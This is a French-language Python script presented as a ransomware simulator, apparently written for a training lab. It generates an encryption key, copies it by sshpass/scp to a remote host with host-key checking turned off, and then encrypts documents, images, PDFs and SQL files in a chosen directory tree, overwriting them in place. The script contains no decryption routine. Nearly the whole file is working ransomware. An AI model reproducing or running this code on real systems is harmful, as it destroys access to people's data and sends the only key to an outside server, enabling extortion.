#!/usr/bin/env python3
# RANSOMWARE SIMULATEUR - AUTHENTIFICATION PAR MOT DE PASSE
import os
import sys
import subprocess
from getpass import getpass
from cryptography.fernet import Fernet
from pathlib import Path

# Configuration
SSH_SERVER = "192.168.45.90"
SSH_USER = "doranco"
REMOTE_DIR = "/home/doranco/cle_dechiffrement"
KEY_FILE = "decryption_key.key"

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        self.ssh_password = None
        self.target_exts = {'.txt', '.doc', '.docx', '.pdf', '.jpg', '.sql'}
    
    def get_password(self):
        """Demande le mot de passe SSH de mani√®re s√©curis√©e"""
        if not self.ssh_password:
            self.ssh_password = getpass(f"Mot de passe SSH pour {SSH_USER}@{SSH_SERVER}: ")
        return self.ssh_password

    def generate_key(self):
        """G√©n√®re une cl√© de chiffrement"""
        print("\n[1/3] üîë G√©n√©ration de la cl√©...")
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        print(f"‚úÖ Cl√© g√©n√©r√©e: {self.key.decode()[:12]}...")
        return True

    def transfer_key(self):
        """Transf√®re la cl√© via SSH avec mot de passe"""
        if not self.key:
            print("‚ùå Aucune cl√© g√©n√©r√©e!")
            return False

        print("\n[2/3] üì§ Transfert de la cl√©...")
        try:
            # Cr√©e le fichier temporaire
            with open(KEY_FILE, 'wb') as f:
                f.write(self.key)

            # 1. Cr√©e le r√©pertoire distant avec sshpass
            subprocess.run([
                'sshpass', '-p', self.get_password(),
                'ssh', f'{SSH_USER}@{SSH_SERVER}',
                f'mkdir -p {REMOTE_DIR}'
            ], check=True)

            # 2. Transfert avec scp
            subprocess.run([
                'sshpass', '-p', self.get_password(),
                'scp', '-o', 'StrictHostKeyChecking=no',
                KEY_FILE,
                f'{SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/'
            ], check=True)

            os.remove(KEY_FILE)
            print(f"‚úÖ Cl√© transf√©r√©e vers {SSH_SERVER}:{REMOTE_DIR}")
            return True

        except subprocess.CalledProcessError as e:
            print(f"‚ùå √âchec du transfert: {e}")
            return False

    def encrypt_files(self, path):
        """Chiffre les fichiers"""
        if not self.key:
            print("‚ùå G√©n√©rer d'abord une cl√©!")
            return

        print(f"\n[3/3] üîí Chiffrement de {path}...")
        count = 0
        for root, _, files in os.walk(path):
            for file in files:
                if Path(file).suffix.lower() in self.target_exts:
                    try:
                        filepath = os.path.join(root, file)
                        with open(filepath, 'rb+') as f:
                            data = f.read()
                            f.seek(0)
                            f.write(self.cipher.encrypt(data))
                            f.truncate()
                        count += 1
                    except Exception as e:
                        print(f"‚ö†Ô∏è Erreur sur {file}: {e}")
        print(f"‚úÖ {count} fichiers chiffr√©s")

    def show_menu(self):
        """Menu interactif"""
        while True:
            print("\n" + "="*40)
            print("MENU PRINCIPAL".center(40))
            print("="*40)
            print("1. G√©n√©rer une cl√©")
            print("2. Transf√©rer la cl√©")
            print("3. Chiffrer un dossier")
            print("4. Tout ex√©cuter (automatique)")
            print("0. Quitter")
            
            choice = input("\nVotre choix: ")
            
            if choice == "1":
                self.generate_key()
            elif choice == "2":
                self.transfer_key()
            elif choice == "3":
                path = input("Chemin du dossier √† chiffrer: ")
                self.encrypt_files(path)
            elif choice == "4":
                if self.generate_key() and self.transfer_key():
                    path = input("\nChemin du dossier √† chiffrer: ")
                    self.encrypt_files(path)
            elif choice == "0":
                print("\nAu revoir!")
                sys.exit(0)
            else:
                print("‚ùå Option invalide!")
            
            input("\nAppuyez sur Entr√©e pour continuer...")

if __name__ == '__main__':
    try:
        # V√©rification des d√©pendances
        try:
            subprocess.run(['sshpass', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            print("""
            ‚ùå sshpass doit √™tre install√© :
            sudo apt update && sudo apt install -y sshpass
            """)
            sys.exit(1)

        sim = RansomwareSimulator()
        sim.show_menu()

    except KeyboardInterrupt:
        print("\nOp√©ration annul√©e")
        sys.exit(0)